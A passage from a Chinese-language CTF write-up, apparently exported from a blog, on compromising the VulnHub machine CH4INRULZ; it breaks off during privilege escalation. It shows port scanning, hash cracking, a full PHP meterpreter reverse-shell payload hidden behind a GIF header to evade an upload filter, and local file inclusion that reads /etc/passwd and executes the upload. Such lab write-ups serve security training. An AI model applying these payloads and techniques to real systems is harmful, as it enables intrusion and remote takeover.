\_ ps aux f</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Write-up-CH4INRULZ_v1.0.1</title>
      <link href="/2018/10/26/Write-up-CH4INRULZ-v1-0-1/"/>
      <url>/2018/10/26/Write-up-CH4INRULZ-v1-0-1/</url>
      
        <content type="html"><![CDATA[<h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><ul><li>下载地址：<a href="https://download.vulnhub.com/ch4inrulz/CH4INRULZ_v1.0.1.ova" target="_blank" rel="noopener">点我</a></li><li>哔哩哔哩：<a href="https://www.bilibili.com/video/av34824902/" target="_blank" rel="noopener">哔哩哔哩</a></li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>网卡：vboxnet0，192.168.56.1/24，Nmap扫存活主机发现IP为192.168.56.101</li></ul><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -sn 192.168.56.1/24</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-26 20:28 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.1</span><br><span class="line">Host is up (0.0017s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.62 seconds</span><br><span class="line">➜  ~ nmap -T4 -A 192.168.56.101</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-26 20:29 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.000089s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.3.5</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 192.168.56.1</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 2.3.5 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 d4:f8:c1:55:92:75:93:f7:7b:65:dd:2b:94:e8:bb:47 (DSA)</span><br><span class="line">|   2048 3d:24:ea:4f:a2:2a:ca:63:b7:f4:27:0f:d9:17:03:22 (RSA)</span><br><span class="line">|_  256 e2:54:a7:c7:ef:aa:8c:15:61:20:bd:aa:72:c0:17:88 (ECDSA)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Ubuntu)</span><br><span class="line">|_http-title: FRANK<span class="string">'s Website | Under development</span></span><br><span class="line"><span class="string">8011/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.2.22 (Ubuntu)</span></span><br><span class="line"><span class="string">|_http-title: Site doesn'</span>t have a title (text/html).</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 13.68 seconds</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure><ul><li>开了FTP，SSH，还开了两个Web服务，dirb扫Web目录发现一个HTTP基本认证的目录和一个API调用接口。</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/development</span><br><span class="line">有密码暂时进不了</span><br><span class="line">http://192.168.56.101:8011/api/</span><br><span class="line">标题：FRANK's API | Under development</span><br><span class="line">页面的意思大概就是这个API用于Frank的服务器，但还在开发中</span><br></pre></td></tr></table></figure><ul><li>继续dirb扫备份文件，找到了基本认证的加密过的密码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ dirb http://192.168.56.101 -X .bak</span><br><span class="line">找到了</span><br><span class="line">http://192.168.56.101/index.html.bak</span><br><span class="line">➜  ~ curl http://192.168.56.101/index.html.bak</span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;This is the default web page <span class="keyword">for</span> this server.&lt;/p&gt;</span><br><span class="line">&lt;p&gt;The web server software is running but no content has been added, yet.&lt;/p&gt;</span><br><span class="line">&lt;a href=<span class="string">"/development"</span>&gt;development&lt;/a&gt;</span><br><span class="line">&lt;!-- I will use frank:<span class="variable">$apr1</span><span class="variable">$1oIGDEDK</span>$/aVFPluYt56UvslZMBDoC0 as the .htpasswd file to protect the development path --&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>保存到文件，John破解得密码是frank!!! </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ <span class="built_in">echo</span> <span class="string">'frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0'</span> &gt;hash.txt</span><br><span class="line">➜  ~ john hash.txt </span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">"md5crypt"</span>, but the string is also recognized as <span class="string">"md5crypt-opencl"</span></span><br><span class="line">Use the <span class="string">"--format=md5crypt-opencl"</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (md5crypt, crypt(3) <span class="variable">$1</span>$ [MD5 128/128 SSE2 12x])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">frank!!!         (frank)</span><br><span class="line">1g 0:00:00:00 DONE 1/3 (2018-10-28 00:17) 9.090g/s 1718p/s 1718c/s 1718C/s Frank[..Fr4nk</span><br><span class="line">Use the <span class="string">"--show"</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure><ul><li>用上面的用户密码登录基本认证发现</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* Here is my unfinished tools list</span><br><span class="line">- the uploader tool (finished but need security review)</span><br><span class="line">*这是我未完成的工具清单</span><br><span class="line">- 上传工具（已完成但需要安全审查）</span><br></pre></td></tr></table></figure><ul><li>继续用dirb加上认证扫目录，发现了有上传，并只能上传图片</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.101/development/ -u <span class="string">'frank:frank!!!'</span></span><br><span class="line">发现了</span><br><span class="line">http://192.168.56.101/development/uploader/</span><br><span class="line">http://192.168.56.101/development/uploader/upload</span><br><span class="line"></span><br><span class="line">Sorry, file already exists.Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed.Sorry, your file was not uploaded.</span><br></pre></td></tr></table></figure><h3 id="绕过上传"><a href="#绕过上传" class="headerlink" title="绕过上传"></a>绕过上传</h3><ul><li>msf生产反弹后门，加GIF98文件头，用脚绕了。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.1 LPOST=7788  -o shell.php</span><br><span class="line">➜  ~ <span class="built_in">echo</span> <span class="string">"GIF98"</span> &gt;666.gif</span><br><span class="line">➜  ~ cat 666.gif </span><br><span class="line">GIF98</span><br><span class="line">➜  ~ cat shell.php &gt;&gt;666.gif </span><br><span class="line">➜  ~ cat 666.gif </span><br><span class="line">GIF98</span><br><span class="line">/*&lt;?php /**/ error_reporting(0); <span class="variable">$ip</span> = <span class="string">'192.168.56.1'</span>; <span class="variable">$port</span> = 4444; <span class="keyword">if</span> ((<span class="variable">$f</span> = <span class="string">'stream_socket_client'</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(<span class="string">"tcp://&#123;<span class="variable">$ip</span>&#125;:&#123;<span class="variable">$port</span>&#125;"</span>); <span class="variable">$s_type</span> = <span class="string">'stream'</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s</span> &amp;&amp; (<span class="variable">$f</span> = <span class="string">'fsockopen'</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>); <span class="variable">$s_type</span> = <span class="string">'stream'</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s</span> &amp;&amp; (<span class="variable">$f</span> = <span class="string">'socket_create'</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(AF_INET, SOCK_STREAM, SOL_TCP); <span class="variable">$res</span> = @socket_connect(<span class="variable">$s</span>, <span class="variable">$ip</span>, <span class="variable">$port</span>); <span class="keyword">if</span> (!<span class="variable">$res</span>) &#123; die(); &#125; <span class="variable">$s_type</span> = <span class="string">'socket'</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s_type</span>) &#123; die(<span class="string">'no socket funcs'</span>); &#125; <span class="keyword">if</span> (!<span class="variable">$s</span>) &#123; die(<span class="string">'no socket'</span>); &#125; switch (<span class="variable">$s_type</span>) &#123; <span class="keyword">case</span> <span class="string">'stream'</span>: <span class="variable">$len</span> = fread(<span class="variable">$s</span>, 4); <span class="built_in">break</span>; <span class="keyword">case</span> <span class="string">'socket'</span>: <span class="variable">$len</span> = socket_read(<span class="variable">$s</span>, 4); <span class="built_in">break</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$len</span>) &#123; die(); &#125; <span class="variable">$a</span> = unpack(<span class="string">"Nlen"</span>, <span class="variable">$len</span>); <span class="variable">$len</span> = <span class="variable">$a</span>[<span class="string">'len'</span>]; <span class="variable">$b</span> = <span class="string">''</span>; <span class="keyword">while</span> (strlen(<span class="variable">$b</span>) &lt; <span class="variable">$len</span>) &#123; switch (<span class="variable">$s_type</span>) &#123; <span class="keyword">case</span> <span class="string">'stream'</span>: <span class="variable">$b</span> .= fread(<span class="variable">$s</span>, <span class="variable">$len</span>-strlen(<span class="variable">$b</span>)); <span class="built_in">break</span>; <span class="keyword">case</span> <span class="string">'socket'</span>: <span class="variable">$b</span> .= socket_read(<span class="variable">$s</span>, <span class="variable">$len</span>-strlen(<span class="variable">$b</span>)); <span class="built_in">break</span>; &#125; &#125; <span class="variable">$GLOBALS</span>[<span class="string">'msgsock'</span>] = <span class="variable">$s</span>; <span class="variable">$GLOBALS</span>[<span class="string">'msgsock_type'</span>] = <span class="variable">$s_type</span>; <span class="keyword">if</span> (extension_loaded(<span class="string">'suhosin'</span>) &amp;&amp; ini_get(<span class="string">'suhosin.executor.disable_eval'</span>)) &#123; <span class="variable">$suhosin_bypass</span>=create_function(<span class="string">''</span>, <span class="variable">$b</span>); <span class="variable">$suhosin_bypass</span>(); &#125; <span class="keyword">else</span> &#123; <span class="built_in">eval</span>(<span class="variable">$b</span>); &#125; die();%</span><br></pre></td></tr></table></figure><ul><li>上传成功，但不知道路径在哪里。要是猜肯定很难找，还不如找其他方法。上面还有一个API接口没有用上。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/development/uploader/upload.php</span><br><span class="line">上传脚本的路径</span><br></pre></td></tr></table></figure><ul><li>API除了<code>files_api.php</code>可以访问，其他的都是404，但是也不知道他接受什么参数，先fuzz一波</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ wfuzz -w Kali-Team/fuzzdb/attack/business-logic/CommonMethodNames.txt --hl 6 <span class="string">'http://192.168.56.101:8011/api/files_api.php?FUZZ=/etc/passwd'</span> </span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.11 - The Web Fuzzer                        *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.56.101:8011/api/files_api.php?FUZZ=/etc/passwd</span><br><span class="line">Total requests: 77</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">IDResponse   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000033:  C=500      5 L      19 W    173 Ch  <span class="string">"file"</span></span><br><span class="line"></span><br><span class="line">Total time: 0.127410</span><br><span class="line">Processed Requests: 77</span><br><span class="line">Filtered Requests: 76</span><br><span class="line">Requests/sec.: 604.3439</span><br></pre></td></tr></table></figure><ul><li>发现接收的参数为file，但是好像被拦截了。试了POST请求可以。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl <span class="string">"http://192.168.56.101:8011/api/files_api.php"</span> -d <span class="string">"file=/etc/passwd"</span></span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;franks website | simple website browser API&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">syslog:x:101:103::/home/syslog:/bin/<span class="literal">false</span></span><br><span class="line">frank:x:1000:1000:frank,,,:/home/frank:/bin/bash</span><br><span class="line">sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">ftp:x:103:111:ftp daemon,,,:/srv/ftp:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure><ul><li>接着用文件包含读取upload的源码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl <span class="string">"http://192.168.56.101:8011/api/files_api.php"</span> -d <span class="string">"file=php://filter/convert.base64-encode/resource=/var/www/development/uploader/upload.php"</span></span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;franks website | simple website browser API&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">PD9waHAKJHRhcmdldF9kaXIgPSAiRlJBTkt1cGxvYWRzLyI7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gYmFzZW5hbWUoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bIm5hbWUiXSk7CiR1cGxvYWRPayA9IDE7CiRpbWFnZUZpbGVUeXBlID0gc3RydG9sb3dlcihwYXRoaW5mbygkdGFyZ2V0X2ZpbGUsUEFUSElORk9fRVhURU5TSU9OKSk7Ci8vIENoZWNrIGlmIGltYWdlIGZpbGUgaXMgYSBhY3R1YWwgaW1hZ2Ugb3IgZmFrZSBpbWFnZQppZihpc3NldCgkX1BPU1RbInN1Ym1pdCJdKSkgewogICAgJGNoZWNrID0gZ2V0aW1hZ2VzaXplKCRfRklMRVNbImZpbGVUb1VwbG9hZCJdWyJ0bXBfbmFtZSJdKTsKICAgIGlmKCRjaGVjayAhPT0gZmFsc2UpIHsKICAgICAgICBlY2hvICJGaWxlIGlzIGFuIGltYWdlIC0gIiAuICRjaGVja1sibWltZSJdIC4gIi4iOwogICAgICAgICR1cGxvYWRPayA9IDE7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIkZpbGUgaXMgbm90IGFuIGltYWdlLiI7CiAgICAgICAgJHVwbG9hZE9rID0gMDsKICAgIH0KfQovLyBDaGVjayBpZiBmaWxlIGFscmVhZHkgZXhpc3RzCmlmIChmaWxlX2V4aXN0cygkdGFyZ2V0X2ZpbGUpKSB7CiAgICBlY2hvICJTb3JyeSwgZmlsZSBhbHJlYWR5IGV4aXN0cy4iOwogICAgJHVwbG9hZE9rID0gMDsKfQovLyBDaGVjayBmaWxlIHNpemUKaWYgKCRfRklMRVNbImZpbGVUb1VwbG9hZCJdWyJzaXplIl0gPiA1MDAwMDApIHsKICAgIGVjaG8gIlNvcnJ5LCB5b3VyIGZpbGUgaXMgdG9vIGxhcmdlLiI7CiAgICAkdXBsb2FkT2sgPSAwOwp9Ci8vIEFsbG93IGNlcnRhaW4gZmlsZSBmb3JtYXRzCmlmKCRpbWFnZUZpbGVUeXBlICE9ICJqcGciICYmICRpbWFnZUZpbGVUeXBlICE9ICJwbmciICYmICRpbWFnZUZpbGVUeXBlICE9ICJqcGVnIgomJiAkaW1hZ2VGaWxlVHlwZSAhPSAiZ2lmIiApIHsKICAgIGVjaG8gIlNvcnJ5LCBvbmx5IEpQRywgSlBFRywgUE5HICYgR0lGIGZpbGVzIGFyZSBhbGxvd2VkLiI7CiAgICAkdXBsb2FkT2sgPSAwOwp9Ci8vIENoZWNrIGlmICR1cGxvYWRPayBpcyBzZXQgdG8gMCBieSBhbiBlcnJvcgppZiAoJHVwbG9hZE9rID09IDApIHsKICAgIGVjaG8gIlNvcnJ5LCB5b3VyIGZpbGUgd2FzIG5vdCB1cGxvYWRlZC4iOwovLyBpZiBldmVyeXRoaW5nIGlzIG9rLCB0cnkgdG8gdXBsb2FkIGZpbGUKfSBlbHNlIHsKICAgIGlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgICAgICBlY2hvICJUaGUgZmlsZSAiLiBiYXNlbmFtZSggJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bIm5hbWUiXSkuICIgaGFzIGJlZW4gdXBsb2FkZWQgdG8gbXkgdXBsb2FkcyBwYXRoLiI7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIlNvcnJ5LCB0aGVyZSB3YXMgYW4gZXJyb3IgdXBsb2FkaW5nIHlvdXIgZmlsZS4iOwogICAgfQp9Cj8+Cgo=</span><br></pre></td></tr></table></figure><ul><li>base64解码发现上传目录是FRANKuploads，之前的木马图片就在这个文件夹里。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target_dir = &quot;FRANKuploads/&quot;;</span><br><span class="line">$target_file = $target_dir . basename($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]);</span><br><span class="line">$uploadOk = 1;</span><br><span class="line">$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));</span><br><span class="line">// Check if image file is a actual image or fake image</span><br><span class="line">if(isset($_POST[&quot;submit&quot;])) &#123;</span><br><span class="line">    $check = getimagesize($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;]);</span><br><span class="line">    if($check !== false) &#123;</span><br><span class="line">        echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;;</span><br><span class="line">        $uploadOk = 1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;File is not an image.&quot;;</span><br><span class="line">        $uploadOk = 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// Check if file already exists</span><br><span class="line">if (file_exists($target_file)) &#123;</span><br><span class="line">    echo &quot;Sorry, file already exists.&quot;;</span><br><span class="line">    $uploadOk = 0;</span><br><span class="line">&#125;</span><br><span class="line">// Check file size</span><br><span class="line">if ($_FILES[&quot;fileToUpload&quot;][&quot;size&quot;] &gt; 500000) &#123;</span><br><span class="line">    echo &quot;Sorry, your file is too large.&quot;;</span><br><span class="line">    $uploadOk = 0;</span><br><span class="line">&#125;</span><br><span class="line">// Allow certain file formats</span><br><span class="line">if($imageFileType != &quot;jpg&quot; &amp;&amp; $imageFileType != &quot;png&quot; &amp;&amp; $imageFileType != &quot;jpeg&quot;</span><br><span class="line">&amp;&amp; $imageFileType != &quot;gif&quot; ) &#123;</span><br><span class="line">    echo &quot;Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed.&quot;;</span><br><span class="line">    $uploadOk = 0;</span><br><span class="line">&#125;</span><br><span class="line">// Check if $uploadOk is set to 0 by an error</span><br><span class="line">if ($uploadOk == 0) &#123;</span><br><span class="line">    echo &quot;Sorry, your file was not uploaded.&quot;;</span><br><span class="line">// if everything is ok, try to upload file</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) &#123;</span><br><span class="line">        echo &quot;The file &quot;. basename( $_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]). &quot; has been uploaded to my uploads path.&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Sorry, there was an error uploading your file.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="GET-SHELL"><a href="#GET-SHELL" class="headerlink" title="GET SHELL"></a>GET SHELL</h3><ul><li>打开msf监听刚刚生成木马的端口，再次使用一次文件包含执行上传的木马。</li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set lport <span class="number">4444</span></span><br><span class="line">lport =&gt; <span class="number">4444</span></span><br><span class="line">msf exploit(multi/handler) &gt; set lhost  <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.1</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.1</span></span><br><span class="line">msf exploit(multi/handler) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.1</span>:<span class="number">4444</span> </span><br><span class="line">[*] Sending stage (<span class="number">37775</span> bytes) to <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span><span class="meta">.56</span><span class="meta">.1</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span>:<span class="number">45900</span>) <span class="meta">at</span> <span class="number">2018</span>-<span class="number">10</span>-<span class="number">28</span> <span class="number">13</span>:<span class="number">15</span>:<span class="number">14</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line">➜  ~ curl <span class="string">"http://192.168.56.101:8011/api/files_api.php"</span> -d <span class="string">"file=/var/www/development/uploader/FRANKuploads/2333.gif"</span></span><br></pre></td></tr></table></figure><h3 id="提权-GefFlag"><a href="#提权-GefFlag" class="headerlink" title="提权+GefFlag"></a>提权+GefFlag</h3><ul><li>试了N个终于找到了一个可以用的<code>exploits/linux_x86-64/local/15023.c</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 